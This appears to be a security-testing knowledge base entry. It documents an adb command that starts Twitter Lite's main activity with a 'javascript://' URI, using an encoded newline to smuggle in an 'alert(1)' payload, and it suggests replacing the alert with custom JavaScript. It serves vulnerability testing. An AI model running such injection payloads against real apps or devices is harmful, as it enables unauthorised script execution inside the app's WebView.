---
data: >-
  adb shell am start -n
  com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d
  "javascript://example.com%0A alert(1);"
tags:
  - adb
  - intent
  - js-injection
type: command
output: Alert box pops up with '1' in the app's WebView
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:31.829Z'
id: 8760c97d-e581-4e23-bcbb-9b5127cff4d8
verified: false
validated: true
submitted: true
---
# adb-start-twitterlite-with-javascript-alert

## Command

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
```

## Description

Launches the activity with a javascript:// URI containing an encoded alert payload to test JS execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -n | Package and activity | Yes |
| -d | Encoded JS URI | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"
```

### Advanced Usage

Replace alert with custom JS: -d "javascript://host%0A customFunction();"

## Expected Output

JS alert displays '1'.

## Related

- [[commands/adb-enumerate-window-properties-in-twitterlite]]
- [[procedures/Inject-JavaScript-via-javascript-URI-in-TwitterLiteActivity]]
